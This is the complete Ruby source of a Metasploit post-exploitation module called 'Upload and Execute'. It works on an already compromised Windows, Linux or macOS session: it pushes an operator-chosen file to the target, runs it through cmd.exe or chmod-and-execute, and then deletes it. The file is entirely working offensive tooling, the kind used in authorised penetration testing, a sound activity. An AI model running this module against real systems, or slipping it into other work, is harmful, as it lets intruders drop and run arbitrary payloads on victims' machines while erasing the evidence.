##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Upload and Execute',
      'Description'   => %q{ Push a file and execute it },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'egypt'],
      'Platform'      => [ 'win','linux','osx' ],
      'SessionTypes'  => [ 'meterpreter','shell' ]
    ))

    register_options(
      [
        OptPath.new('LFILE', [true,'Local file to upload and execute']),
        OptString.new('RFILE', [false,'Name of file on target (default is basename of LFILE)']),
      ])
  end

  def rfile
    if datastore['RFILE'].blank?
      remote_name = File.basename(datastore['LFILE'])
    else
      remote_name = datastore['RFILE']
    end

    remote_name
  end

  def lfile
    datastore['LFILE']
  end

  def run
    upload_file(rfile, lfile)

    if session.platform.include?("windows")
      cmd_exec("cmd.exe /c start #{rfile}", nil, 0)
    else
      cmd_exec("chmod 755 #{rfile} && ./#{rfile}", nil, 0)
    end
    rm_f(rfile)
  end

end

